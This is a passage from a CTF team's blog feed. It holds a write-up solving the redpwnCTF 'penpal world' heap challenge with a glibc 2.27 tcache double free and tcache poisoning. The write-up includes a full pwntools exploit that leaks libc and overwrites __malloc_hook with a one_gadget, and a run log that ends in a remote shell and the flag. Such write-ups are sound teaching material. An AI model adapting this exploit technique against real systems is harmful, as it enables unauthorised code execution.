class="line">[*] Stopped process <span class="string">'./penpal_world'</span> (pid 2596)</span><br></pre></td></tr></table></figure></p><h3 id="LEAKING-LIBC"><a href="#LEAKING-LIBC" class="headerlink" title="LEAKING LIBC"></a>LEAKING LIBC</h3><p>We can only do mallocs of size <strong>0x48</strong>, we somehow need to overwrite the size of one chunk because fastbin chunk sizes will only get us heap addresses, in order to leak a libc address we need a unsorted bin chunk size for example 0x91 will do it. </p><p>Perhaps since this version of libc uses <strong>tcache</strong>, at every chunk bellow 0x410 are treated as it was a fastbin chunk even if we free a 0x91 chunk we will not get a libc address, luckily there is a <strong>limit</strong> to the tcache which is <strong>7</strong>  we need to fill a <strong>tcache bin</strong> of size 0x91, we can do it by freeing that chunk 7 times the 8th time will be treated as an unsorted bin updating both fd and bk pointers into libc addresses.</p><p>But to overwrite the size of a chunk we need to use the <strong>tcache poisoning attack</strong> you can find an example <a href="https://github.com/erosjohn/how2heap/blob/master/glibc_2.26/tcache_poisoning.c" target="_blank" rel="noopener">here</a>.</p><p>In the end we want malloc to return an arbitrary address where we can start writing stuff into an address that is able  to overwrite the size of 0x51 to 0x91, when malloc executes it will try to find a chunk in the <strong>tcache bin</strong> of that size so it can reuse the same space in memory from previous freed chunks, if we <strong>modify</strong> the fd pointer with <strong>UAF</strong>, malloc will instead return the pointer we modified getting us an <strong>arbitrary write</strong>.</p><p>First we need to find a cool address we can write to, we already leaked a heap address, we just need to find the offset near the 0x51 size, we can do it with this:<br><a data-fancybox="gallery" href="https://i.imgur.com/Ya6ZWlt.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Ya6ZWlt.png" alt><br></a></p><p>The code to overwrite the size would look like this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x90</span>)) <span class="comment"># change the fd pointer to get arbitrary write with malloc</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># NEW ALLOCATION (NO MEMORY REUSE) ALLOCATE CHUNK B and prevent merge with top chunk</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># OVERWRITES THE SIZE OF CHUNK 'B'</span></span><br></pre></td></tr></table></figure></p><p>After changing the <strong>FD</strong> with edit we need to do two mallocs until we get the right pointer, because on the first two frees the single linked list of the tcache chunks(0x50) is like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap+0x60 -&gt; heap+0x60 &lt;- 0x0</span><br></pre></td></tr></table></figure><p>After editing the FD with <strong>heap+0x90</strong> we get this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span><br></pre></td></tr></table></figure><p>The list after the first malloc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap+0x90 &lt;- 0x0</span><br></pre></td></tr></table></figure></p><p>The list after the second malloc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0 (empty)</span><br></pre></td></tr></table></figure></p><p>The next step is to fill tcache bin (0x90) remember the max is 7 so we need to free 7 times. </p><p>Also we need to add 2 new chunks and create two fake chunks in the end to bypass the security check from <strong>int_free</strong>, since it isn’t a tcache bin we need to worry about that. </p><p>The size field of the next chunk should correspond to the size that has overwritten the size of chunk B and with a valid size with its flag prev_in_use set to 1.</p><p>The <strong>lowest</strong> bit of size is the prev_in_use flag, 0x51 represented in binary is 0101000<strong>1</strong>, the lowest bit is set to one.</p><p>PREV_INUSE, <strong>records</strong> whether the previous chunk is allocated. In general, the P bit of the size field of the <strong>first allocated memory block</strong> in the heap is set to <strong>1</strong> to prevent access to the previous <strong>illegal memory</strong>. When the P bit of the size of a chunk is 0, we can get the <strong>size</strong> and <strong>address</strong> of the previous chunk through the <strong>prev_size</strong> field.</p><p>The Chunk C is for this security check <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4280" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4280</a><br><a data-fancybox="gallery" href="https://i.imgur.com/uGz3Eu9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/uGz3Eu9.png" alt><br></a></p><p>The Chunk D is to prevent going into unlink at <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4303" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4303</a> :</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Ir1dvEf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Ir1dvEf.png" alt><br></a></p><p>if we set nextinuse into 1 we won’t get an error at <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1405" target="_blank" rel="noopener">https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1405</a> because we don’t even enter at unlink<br><a data-fancybox="gallery" href="https://i.imgur.com/biRvmS1.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/biRvmS1.png" alt><br></a></p><p>One final thing, we already knew that we needed to set a fake chunk at chunk C with prev_in_use to 1 but why the size of 0x50 ? as you can see the function that calculates the offset to the <strong>prev_in_use</strong> of the fake chunk at chunk D uses function <strong>inuse_bit_at_offset</strong> which uses the size of previous 0x50(variable s) to find chunks D prev_in_use.<br><a data-fancybox="gallery" href="https://i.imgur.com/OqsTjG3.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/OqsTjG3.png" alt><br></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,(<span class="string">'C'</span>*<span class="number">0x30</span> +p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>))) <span class="comment"># TO PREVENT double free or corruption (!prev)</span></span><br><span class="line">add(<span class="number">1</span>) </span><br><span class="line">edit(<span class="number">1</span>, (<span class="string">'D'</span>*<span class="number">0x30</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x01</span>))) <span class="comment"># TO PREVENT corrupted size vs. prev_size (as long as prev_in_use is set any values work (0x1,0x51,0x61 etc..)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment"># Filling tcachebin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># free unsortedbin</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK LIBC</span></span><br><span class="line">l =  u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure><p>Lets see how this looks in GDB, this is the look of tcache bins(0x90) after the 7 frees:<br><a data-fancybox="gallery" href="https://i.imgur.com/ropfJc7.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ropfJc7.png" alt><br></a></p><p>Now the 8th free which is the unsorted bin:<br><a data-fancybox="gallery" href="https://i.imgur.com/d0JaLL7.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/d0JaLL7.png" alt><br></a></p><h3 id="Overwrite-malloc-hook-with-the-address-of-a-one-gadget"><a href="#Overwrite-malloc-hook-with-the-address-of-a-one-gadget" class="headerlink" title="Overwrite __malloc_hook with the address of a one gadget"></a>Overwrite __malloc_hook with the address of a one gadget</h3><p>Malloc hook executes with malloc (it’s used for debugging) initially is set to 0x0 , using <strong>TCACHE POISONING</strong> we can overwrite its address with the address of <strong>onegadget</strong>. Getting a free shell after triggering malloc.</p><p>Getting the onegadget offset using <a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">https://github.com/david942j/one_gadget</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc-2.27.so </span><br><span class="line">0x4f2c5 execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f322 execve(<span class="string">"/bin/sh"</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a38c execve(<span class="string">"/bin/sh"</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>The offset that works with the restriction is 0x10a38c.<br>Making malloc to return the address of <strong>__malloc_hook</strong> and overwriting it with onegadget:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">LIBC_BASE = l<span class="number">-0x3ebca0</span></span><br><span class="line">MALLOC_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">FREE_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">ONE_GADGET = LIBC_BASE+<span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment">################################### OVERWRITE MALLOC_HOOK</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(MALLOC_HOOK)) <span class="comment"># change the address of FD to MALLOC_HOOK</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># returns the address of malloc_hook</span></span><br><span class="line">edit(<span class="number">0</span>,p64(ONE_GADGET)) <span class="comment"># Overwrites content of malloc_hook to ONE_GADGET</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># trigers malloc hook</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>The full exploit:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host, port = <span class="string">"chall2.2019.redpwn.net"</span>, <span class="string">"4010"</span></span><br><span class="line">filename = <span class="string">"./penpal_world"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF('/glibc/2.27/64/lib/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc<span class="comment">#ELF('/glibc/2.27/64/lib/libc-2.27.so')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"><span class="comment">#rop=ROP([libc])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    <span class="comment">#bp = [0xea0,0xd31,0xc52]</span></span><br><span class="line">    <span class="comment">#bp = [0x00000dfb,0x00000b7c,0x00000d10]</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    <span class="comment">#r.sendlineafter()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    r.sendafter(<span class="string">'Write.\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line">    <span class="comment">#r.recvuntil('Command me: ')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4) Read a postcard\n'</span>,str(<span class="number">4</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">'Which envelope #?\n'</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">debug([<span class="number">0xb11</span>,<span class="number">0x9b3</span>])<span class="comment">#0xb11,0x9b3]) #0x9b3 0xB11 0xa7c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################################### LEAK FUCKING LIBC</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'A'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># DOUBLE FREE (no security checks while in tcache at this libc version)</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK HEAP</span></span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x60</span></span><br><span class="line">log.info(<span class="string">'0x%x'</span>%heap)</span><br><span class="line">log.info(<span class="string">'0x%x'</span>%(heap+<span class="number">0x100</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x90</span>)) <span class="comment"># change the fd pointer to get arbitrary write with malloc</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># MALLOC RETURNS heap+0x60 tchachebin(0x50): heap+0x60 -&gt; heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># MALLOC RETURNS heap+0x90 tchachebin(0x50): heap+0x90 &lt;- 0x0</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># NEW ALLOCATION (NO MEMORY REUSE) THIS ONE IS DONE HERE TO PREVENT MERGE WITH TOP CHUNK</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">'B'</span>*<span class="number">0x30</span> + p64(<span class="number">0x0</span>)+ p64(<span class="number">0x51</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)) <span class="comment"># OVERWRITES THE SIZE OF CHUNK 'B'</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BIN</span></span><br><span class="line">edit(<span class="number">1</span>,(<span class="string">'C'</span>*<span class="number">0x30</span> +p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)))</span><br><span class="line">add(<span class="number">1</span>) <span class="comment"># TO PREVENT FREE ERRORS WHEN FREEING AN UNSORTED BIN</span></span><br><span class="line">edit(<span class="number">1</span>, (<span class="string">'D'</span>*<span class="number">0x30</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x51</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment"># Filling tcachebin</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># free unsortedbin</span></span><br><span class="line">read(<span class="number">0</span>) <span class="comment"># LEAK LIBC</span></span><br><span class="line">l =  u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="comment">#log.info(hex(rop.search(regs=['rdi'], order = 'regs').address))</span></span><br><span class="line">LIBC_BASE = l<span class="number">-0x3ebca0</span></span><br><span class="line">MALLOC_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">FREE_HOOK = LIBC_BASE+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">SYSTEM = LIBC_BASE+ libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">BINSH = LIBC_BASE+ libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">ONE_GADGET = LIBC_BASE+<span class="number">0x10a38c</span></span><br><span class="line">POPRDI = LIBC_BASE+<span class="number">0x2155f</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"MAIN ARENA+0x96 0x%x"</span>%l)</span><br><span class="line">log.info(<span class="string">"LIBCBASE 0x%x"</span>%LIBC_BASE)</span><br><span class="line">log.info(<span class="string">"ONEGADGET 0x%x"</span>%ONE_GADGET)</span><br><span class="line">log.info(<span class="string">"MALLOC HOOK 0x%x"</span>%MALLOC_HOOK)</span><br><span class="line">log.info(<span class="string">"FREE HOOK 0x%x"</span>%FREE_HOOK)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">log.info(<span class="string">"BIN_SH 0x%x"</span>%BINSH)</span><br><span class="line">log.info(<span class="string">"POP RDI 0x%x"</span>%POPRDI)</span><br><span class="line">log.info(<span class="string">"JUMP 0x%x"</span>%(heap+<span class="number">0x150</span>))<span class="comment">#0x1d8b6b0))</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"HEAP 0x%x"</span>%(heap)) <span class="comment">#24</span></span><br><span class="line">log.info(<span class="string">"NEXT HEAP 0x%x"</span>%(heap+<span class="number">0x130</span>))</span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line"><span class="comment">################################### OVERWRITE MALLOC_HOOK</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(MALLOC_HOOK)) <span class="comment"># change the address of FD to MALLOC_HOOK</span></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># returns the address of malloc_hook</span></span><br><span class="line">edit(<span class="number">0</span>,p64(ONE_GADGET)) <span class="comment"># Overwrites content of malloc_hook to ONE_GADGET</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># trigers malloc hook</span></span><br><span class="line"><span class="comment">#########################################################</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><p>Running it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ root@redpwn:/ctf/work/pwn/pepal_world<span class="comment"># python penpal_world.py REMOTE</span></span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/pepal_world/penpal_world'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/pepal_world/libc-2.27.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to chall2.2019.redpwn.net on port 4010: Done</span><br><span class="line">[*] 0x561de3031200</span><br><span class="line">[*] 0x561de3031300</span><br><span class="line">[*] MAIN ARENA+0x96 0x7f79a7fe2ca0</span><br><span class="line">[*] LIBCBASE 0x7f79a7bf7000</span><br><span class="line">[*] ONEGADGET 0x7f79a7d0138c</span><br><span class="line">[*] MALLOC HOOK 0x7f79a7fe2c30</span><br><span class="line">[*] FREE HOOK 0x7f79a7fe48e8</span><br><span class="line">[*] SYSTEM 0x7f79a7c46440</span><br><span class="line">[*] BIN_SH 0x7f79a7daae9a</span><br><span class="line">[*] POP RDI 0x7f79a7c1855f</span><br><span class="line">[*] JUMP 0x561de3031350</span><br><span class="line">[*] HEAP 0x561de3031200</span><br><span class="line">[*] NEXT HEAP 0x561de3031330</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag.txt</span><br><span class="line">flag&#123;0h_n0e5_sW1p3r_d1D_5w!peEEeE&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;penpal world&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;436&lt;/p&gt;
&lt;p&gt;Written by: jespiron&lt;/p&gt;
&lt;p&gt;Pleas
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Tcache" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"/>
    
      <category term="tcache_dup" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-dup/"/>
    
      <category term="tcache_poisoning" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning/"/>
    
    
      <category term="redpwnctf2017" scheme="https://teamrocketist.github.io/tags/redpwnctf2017/"/>
    
      <category term="double_free" scheme="https://teamrocketist.github.io/tags/double-free/"/>
    
      <category term="use_after_free" scheme="https://teamrocketist.github.io/tags/use-after-free/"/>
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="tcache_poisoning" scheme="https://teamrocketist.github.io/tags/tcache-poisoning/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] CyBRICS CTF Quals 2019 - Hidden Flag</title>
    <link href="https://teamrocketist.github.io/2019/07/27/Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag/"/>
    <id>https://teamrocketist.github.io/2019/07/27/Reverse-CyBRICS-CTF-Quals-2019-Hidden-Flag/</id>
    <published>2019-07-27T15:31:43.000Z</published>
    <updated>2019-07-27T18:21:15.621Z</updated>
    
